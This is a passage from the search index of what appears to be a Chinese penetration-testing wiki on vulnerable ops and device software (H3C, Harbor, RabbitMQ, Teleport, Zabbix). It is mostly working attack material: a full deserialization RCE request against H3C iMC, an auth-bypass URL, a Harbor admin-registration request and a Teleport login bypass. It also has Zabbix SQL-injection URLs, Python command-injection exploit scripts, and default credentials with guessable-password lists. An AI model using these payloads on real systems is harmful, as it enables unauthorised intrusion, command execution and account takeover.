pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami","title":"H3C"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/H3C/H3C/#h3c","text":"","title":"H3C"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/H3C/H3C/#_1","text":"secpath\u5821\u5792\u673a \u672a\u6388\u6743\u7528\u6237\u767b\u5f55 IMC \u667a\u80fd\u7ba1\u7406\u4e2d\u5fc3 \u9ed8\u8ba4\u5bc6\u7801 rce","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/H3C/H3C/#secpath","text":"app=\"H3C-SecPath-\u8fd0\u7ef4\u5ba1\u8ba1\u7cfb\u7edf\" && body=\"2018\"","title":"secpath\u5821\u5792\u673a"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/H3C/H3C/#_2","text":"/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin","title":"\u672a\u6388\u6743\u7528\u6237\u767b\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/H3C/H3C/#imc","text":"","title":"IMC \u667a\u80fd\u7ba1\u7406\u4e2d\u5fc3"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/H3C/H3C/#_3","text":"\u524d\u53f0\u5bc6\u7801\uff1a iMC PLAT 7.3 (E0706)\u4e4b\u524d\u7248\u672c\u9ed8\u8ba4\u5bc6\u7801\u662fadmin iMC PLAT 7.3 (E0706)\u53ca\u540e\u7eed\u7248\u672c\u9ed8\u8ba4\u5bc6\u7801\u662f Pwd@12345 \u540e\u53f0\u5bc6\u7801\uff1a windows\u5bc6\u7801\u4e3a\u8fdb\u5165\u64cd\u4f5c\u7cfb\u7edf\u7684\u5bc6\u7801 linux\u4e3a\u81ea\u5df1\u8bbe\u7f6e\u7684root\u5bc6\u7801\uff0c\u5982\u679c\u662f\u4e00\u952e\u90e8\u7f72\u7248\u672c\uff0c\u5219root\u5bc6\u7801\u9ed8\u8ba4\u4e3aiMC123","title":"\u9ed8\u8ba4\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/H3C/H3C/#rce","text":"POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1 Host: <IP:PORT> Cache-Control: max-age=0 sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8 Cookie: oam.Flash.RENDERMAP.TOKEN=h6t3jznn9; JSESSIONID=28B00884107242919B20BD70146EDFCB; currentThemeName=imc-new-webui Content-Type: application/x-www-form-urlencoded Content-Length: 1567 pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami","title":"rce"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Habor/Habor/","text":"Habor \u76ee\u5f55 \u524d\u6e17\u900f web ui \u9ed8\u8ba4\u5bc6\u7801 \u914d\u7f6e\u4e0d\u5f53\u5bfc\u81f4\u955c\u50cf\u4efb\u610f\u4e0b\u8f7d \u83b7\u53d6harbor\u7248\u672c\u4fe1\u606f \uff08CVE-2019-16097\uff09Harbor\u4efb\u610f\u7ba1\u7406\u5458\u6ce8\u518c \u955c\u50cf\u4ed3\u5e93 \u524d\u6e17\u900f web ui \u9ed8\u8ba4\u5bc6\u7801 admin Harbor12345 \u914d\u7f6e\u4e0d\u5f53\u5bfc\u81f4\u955c\u50cf\u4efb\u610f\u4e0b\u8f7d \u5728\u754c\u9762\u4e0a\u627e\u5230\u4e00\u4e2a\u641c\u7d22\u529f\u80fd: \u8f93\u5165123\uff0c\u7136\u540e\u6293\u5305\uff0c\u5bf9\u5e94\u53c2\u6570\u6539\u4e3a\u7a7a\u503c\uff0c \u7136\u540e\u53d1\u5305\u8fc7\u53bb\uff0c\u5373\u53ef\u5728\u754c\u9762\u4e0a\u83b7\u53d6\u5168\u90e8\u7684\u6570\u636e \u70b9\u51fb\u8981\u4e0b\u7684\u955c\u50cf\uff0c\u62e6\u622a\u54cd\u5e94\u5305\uff0c\u5305\u4f53\u6539\u4e3a\u8fd9\u4e2a {\"code\":200,\"message\":\"UnAuthorize\"} \u83b7\u53d6harbor\u7248\u672c\u4fe1\u606f /api/systeminfo \u6216\u8005 \u767b\u5f55\u9875\u53f3\u4e0a\u89d2\u2192\u5173\u4e8e \uff08CVE-2019-16097\uff09Harbor\u4efb\u610f\u7ba1\u7406\u5458\u6ce8\u518c Harbor 1.7.6\u4e4b\u524d\u7248\u672c Harbor 1.8.3\u4e4b\u524d\u7248\u672c POST /api/users HTTP/1.1 Host: 127.0.0.1 Content-Length: 131 Accept: application/json Origin: http://127.0.0.1 User-Agent: Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14 Content-Type: application/json Referer: http://127.0.0.1/harbor/sign-in Accept-Language: zh-CN,zh;q=0.9 Cookie: sid=5bb9aad90164bd2ed5274edaf20f9c81 Connection: close {\"username\":\"mrhonest\",\"email\":\"mrhonest@qq.com\",\"realname\":\"mrhonest\",\"password\":\"111111Aaa\",\"comment\":\"11111\",\"has_admin_role\":true} \u4e3b\u8981\u662f\"has_admin_role\":true\u8fd9\u4e2a\u5c5e\u6027\u624d\u9020\u6210\u7684\u4efb\u610f\u7ba1\u7406\u5458\u6ce8\u518c","title":"Habor"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Habor/Habor/#habor","text":"","title":"Habor"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Habor/Habor/#_1","text":"\u524d\u6e17\u900f web ui \u9ed8\u8ba4\u5bc6\u7801 \u914d\u7f6e\u4e0d\u5f53\u5bfc\u81f4\u955c\u50cf\u4efb\u610f\u4e0b\u8f7d \u83b7\u53d6harbor\u7248\u672c\u4fe1\u606f \uff08CVE-2019-16097\uff09Harbor\u4efb\u610f\u7ba1\u7406\u5458\u6ce8\u518c \u955c\u50cf\u4ed3\u5e93","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Habor/Habor/#_2","text":"","title":"\u524d\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Habor/Habor/#web-ui","text":"admin Harbor12345","title":"web ui \u9ed8\u8ba4\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Habor/Habor/#_3","text":"\u5728\u754c\u9762\u4e0a\u627e\u5230\u4e00\u4e2a\u641c\u7d22\u529f\u80fd: \u8f93\u5165123\uff0c\u7136\u540e\u6293\u5305\uff0c\u5bf9\u5e94\u53c2\u6570\u6539\u4e3a\u7a7a\u503c\uff0c \u7136\u540e\u53d1\u5305\u8fc7\u53bb\uff0c\u5373\u53ef\u5728\u754c\u9762\u4e0a\u83b7\u53d6\u5168\u90e8\u7684\u6570\u636e \u70b9\u51fb\u8981\u4e0b\u7684\u955c\u50cf\uff0c\u62e6\u622a\u54cd\u5e94\u5305\uff0c\u5305\u4f53\u6539\u4e3a\u8fd9\u4e2a {\"code\":200,\"message\":\"UnAuthorize\"}","title":"\u914d\u7f6e\u4e0d\u5f53\u5bfc\u81f4\u955c\u50cf\u4efb\u610f\u4e0b\u8f7d"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Habor/Habor/#harbor","text":"/api/systeminfo \u6216\u8005 \u767b\u5f55\u9875\u53f3\u4e0a\u89d2\u2192\u5173\u4e8e","title":"\u83b7\u53d6harbor\u7248\u672c\u4fe1\u606f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Habor/Habor/#cve-2019-16097harbor","text":"Harbor 1.7.6\u4e4b\u524d\u7248\u672c Harbor 1.8.3\u4e4b\u524d\u7248\u672c POST /api/users HTTP/1.1 Host: 127.0.0.1 Content-Length: 131 Accept: application/json Origin: http://127.0.0.1 User-Agent: Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14 Content-Type: application/json Referer: http://127.0.0.1/harbor/sign-in Accept-Language: zh-CN,zh;q=0.9 Cookie: sid=5bb9aad90164bd2ed5274edaf20f9c81 Connection: close {\"username\":\"mrhonest\",\"email\":\"mrhonest@qq.com\",\"realname\":\"mrhonest\",\"password\":\"111111Aaa\",\"comment\":\"11111\",\"has_admin_role\":true} \u4e3b\u8981\u662f\"has_admin_role\":true\u8fd9\u4e2a\u5c5e\u6027\u624d\u9020\u6210\u7684\u4efb\u610f\u7ba1\u7406\u5458\u6ce8\u518c","title":"\uff08CVE-2019-16097\uff09Harbor\u4efb\u610f\u7ba1\u7406\u5458\u6ce8\u518c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/RabbitMQ/RabbitMQ/","text":"RabbitMQ \u5f00\u6e90\u7684\u6d88\u606f\u961f\u5217\u4e2d\u95f4\u4ef6,\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\u4f20\u9012\u3001\u5b58\u50a8\u548c\u63a5\u6536\u6d88\u606f \u8bbf\u5ba2\u8d26\u6237 guest guest","title":"RabbitMQ"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/RabbitMQ/RabbitMQ/#rabbitmq","text":"\u5f00\u6e90\u7684\u6d88\u606f\u961f\u5217\u4e2d\u95f4\u4ef6,\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\u4f20\u9012\u3001\u5b58\u50a8\u548c\u63a5\u6536\u6d88\u606f","title":"RabbitMQ"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/RabbitMQ/RabbitMQ/#_1","text":"guest guest","title":"\u8bbf\u5ba2\u8d26\u6237"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Teleport/Teleport/","text":"Teleport \u76ee\u5f55 \u5821\u5792\u673a \u7528\u6237\u767b\u5f55poc \u5821\u5792\u673a app=\"TELEPORT\u5821\u5792\u673a\" \u7528\u6237\u767b\u5f55poc \u9a8c\u8bc1\u7801\u8981\u6b63\u786e post: http://{{Hostname}}/auth/do-login args={\"type\":2,\"username\":\"admin\",\"password\":null,\"captcha\":\"7hly\",\"oath\":\"\",\"remember\":false} \u7136\u540e\u8bbf\u95ee /dashboard \u5373\u53ef\u8bbf\u95ee\u540e\u53f0","title":"Teleport"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Teleport/Teleport/#teleport","text":"","title":"Teleport"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Teleport/Teleport/#_1","text":"\u5821\u5792\u673a \u7528\u6237\u767b\u5f55poc","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Teleport/Teleport/#_2","text":"app=\"TELEPORT\u5821\u5792\u673a\"","title":"\u5821\u5792\u673a"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Teleport/Teleport/#poc","text":"\u9a8c\u8bc1\u7801\u8981\u6b63\u786e post: http://{{Hostname}}/auth/do-login args={\"type\":2,\"username\":\"admin\",\"password\":null,\"captcha\":\"7hly\",\"oath\":\"\",\"remember\":false} \u7136\u540e\u8bbf\u95ee /dashboard \u5373\u53ef\u8bbf\u95ee\u540e\u53f0","title":"\u7528\u6237\u767b\u5f55poc"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/X11/X11/","text":"X11 https://book.hacktricks.xyz/v/cn/network-services-pentesting/6000-pentesting-x11","title":"X11"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/X11/X11/#x11","text":"https://book.hacktricks.xyz/v/cn/network-services-pentesting/6000-pentesting-x11","title":"X11"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Zabbix/Zabbix/","text":"Zabbix \u76ee\u5f55 \u7cfb\u7edf\u63a2\u6d4b \u53d1\u8d77\u653b\u51fb \u9ed8\u8ba4\u5bc6\u7801 CVE-2022-23131 CVE-2016-10134 CVE-2017-2824 - \u547d\u4ee4\u6ce8\u5165 CVE-2020-11800 - \u547d\u4ee4\u6ce8\u5165 \u540e\u6e17\u900f EnableRemoteCommands \u53c2\u6570\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c zabbix_get UserParameter \u81ea\u5b9a\u4e49\u53c2\u6570\u547d\u4ee4\u6ce8\u5165 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 ref Zabbix\u662f\u4e00\u4e2a\u8bbe\u5907\u76d1\u63a7\u5668\uff0c\u76d1\u63a7\u5404\u4e2a\u670d\u52a1\u5668\u7684\u72b6\u6001 \u5e38\u89c1\u67b6\u6784\uff0cserver\u662f\u76d1\u63a7\u7aef\uff0cagent\u662f\u88ab\u76d1\u63a7\u7aef \u82e5\u9700\u8981\u5927\u89c4\u6a21\u76d1\u63a7\uff0c\u5219\u53ef\u4ee5\u7528\u5982\u4e0b\u6a21\u5f0f \u7cfb\u7edf\u63a2\u6d4b \u53d1\u8d77\u653b\u51fb \u9ed8\u8ba4\u5bc6\u7801 \u00b7 \u8d85\u7ea7\u7ba1\u7406\u5458\u9ed8\u8ba4\u8d26\u53f7\uff1aAdmin\uff0c\u5bc6\u7801\uff1azabbix \u00b7 Guests\u7528\u6237\uff0c\u8d26\u53f7\uff1aguest\uff0c\u5bc6\u7801\u4e3a\u7a7a \u00b7 Mysql\u5f31\u53e3\u4ee4 \u9664\u4e86\u9ed8\u8ba4root\u7528\u6237\u65e0\u6cd5\u5916\u8fde\u4e4b\u5916\uff0c\u8fd0\u7ef4\u901a\u5e38\u4f1a\u65b0\u5efaMySQL\u7528\u6237 zabbix \uff0c\u6839\u636e\u7528\u6237\u4e60\u60ef\u68b3\u7406\u4e86 zabbix \u7528\u6237\u7684\u5e38\u89c1\u5bc6\u7801\uff1a 123456 zabbix zabbix123 zabbix1234 zabbix12345 zabbix123456 CVE-2022-23131 \u767b\u5f55\u7ed5\u8fc7 5.4.0-5.4.8 6.0.0alpha1 https://github.com/Mr-xn/cve-2022-23131 CVE-2016-10134 Zabbix 2.2.14\u4e4b\u524d\u7684\u7248\u672c\u548c3.0.4\u4e4b\u524d\u76843.0\u7248\u672c\u4e2d\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e \u8bbf\u5ba2\u767b\u5f55 \u767b\u5f55\u540e\uff0c\u67e5\u770bCookie\u4e2d\u7684zbx_sessionid\uff0c\u590d\u5236\u540e16\u4f4d\u5b57\u7b26 \u5c06\u8fd916\u4e2a\u5b57\u7b26\u4f5c\u4e3asid\u7684\u503c\uff0c\u8bbf\u95ee http://192.168.92.132:8080 /latest.php?output=ajax&sid= sid\u503c&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0) payload2\uff0c\u8fd9\u4e2apayload\u65e0\u9700\u767b\u5f55 http://192.168.92.132:8080/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=profileldx2=(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(0x7e,name,0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17 CVE-2017-2824 - \u547d\u4ee4\u6ce8\u5165 \u524d\u63d0\uff1a\u5f00\u542f\u81ea\u52a8\u6ce8\u518c exp import sys import socket import json import sys def send(ip, data): conn = socket.create_connection((ip, 10051), 10) conn.send(json.dumps(data).encode()) data = conn.recv(2048) conn.close() return data target = sys.argv[1] print(send(target, {\"request\":\"active checks\",\"host\":\"vulhub\",\"ip\":\";touch /tmp/success\"})) for i in range(10000, 10500): data = send(target, {\"request\":\"command\",\"scriptid\":1,\"hostid\":str(i)}) if data and b'failed' not in data: print('hostid: %d' % i) print(data) CVE-2020-11800 - \u547d\u4ee4\u6ce8\u5165 \u8be5\u6f0f\u6d1e\u4e3a\u57fa\u4e8e CVE-2017-2824 \u7684\u7ed5\u8fc7\u5229\u7528\u3002\u672a\u6388\u6743\u653b\u51fb\u8005\u5411 Zabbix Server \u7684 10051 \u7aef\u53e3\u53d1\u9001 trapper \u529f\u80fd\u76f8\u5173\u547d\u4ee4\uff0c\u5229\u7528\u6f0f\u6d1e\u5373\u53ef\u5728 Zabbix Server \u4e0a\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002 \u5176\u4e2d CVE-2020-11800 \u6f0f\u6d1e\u901a\u8fc7 ipv6 \u683c\u5f0f\u7ed5\u8fc7 ip \u5b57\u6bb5\u68c0\u6d4b\u6ce8\u5165\u6267\u884c shell \u547d\u4ee4\uff0c \u53d7\u6570\u636e\u8868\u5b57\u6bb5\u9650\u5236 Payload \u957f\u5ea6\u53ea\u80fd\u4e3a 64 \u4e2a\u5b57\u7b26 \u3002 {\"request\":\"active checks\",\"host\":\"vulhub\",\"ip\":\"ffff:::;whoami\"} exp import sys import socket import json import sys def send(ip, data): conn = socket.create_connection((ip, 10051), 10) conn.send(json.dumps(data).encode()) data = conn.recv(2048) conn.close() return data target = sys.argv[1] print(send(target, {\"request\":\"active checks\",\"host\":\"vulhub\",\"ip\":\"ffff:::;whoami\"})) for i in range(10000, 10500): data = send(target, {\"request\":\"command\",\"scriptid\":1,\"hostid\":str(i)}) if data and b'failed' not in data: print('hostid: %d' % i) print(data) \u540e\u6e17\u900f EnableRemoteCommands \u53c2\u6570\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c \u5728agent\u4e0a\u6267\u884c\u547d\u4ee4\u9700\u8981\u5728 zabbix_agentd.conf \u914d\u7f6e\u6587\u4ef6\u4e2d\u5f00\u542fEnableRemoteCommands\u53c2\u6570\uff0c\u5728server\u4e0a\u6267\u884c\u547d\u4ee4\u5c31\u4e0d\u7528\u3002 \u5982\u679c\u8981\u6307\u5b9a\u67d0\u4e2aagent\u6267\u884c\u8be5\u811a\u672c\uff0c\u53ef\u4eceZabbix Web\u7684\u201c\u76d1\u6d4b\u4e2d -> \u6700\u65b0\u6570\u636e\u201d\u529f\u80fd\u4e2d\u6839\u636e\u8fc7\u6ee4\u6761\u4ef6\u627e\u5230\u60f3\u8981\u6267\u884c\u811a\u672c\u7684\u4e3b\u673a\uff0c\u5355\u51fb\u4e3b\u673a\u540d\u5373\u53ef\u5728\u5bf9\u5e94Agent\u4e0a\u6267\u884c\u811a\u672c\u3002 \u8fd9\u91cc\u6709\u4e2a\u5e38\u89c1\u8bef\u533a\uff0c\u5982\u679c\u7c7b\u578b\u662f\u201c\u6267\u884c\u5728Zabbix\u670d\u52a1\u5668\u201d\uff0c\u65e0\u8bba\u9009\u62e9\u54ea\u53f0\u4e3b\u673a\u6267\u884c\u811a\u672c\uff0c\u6700\u7ec8\u90fd\u662f\u6267\u884c\u5728Zabbix Server\u4e0a\u3002 zabbix_get \u5982\u679c\u4e0d\u60f3\u5728Zabbix 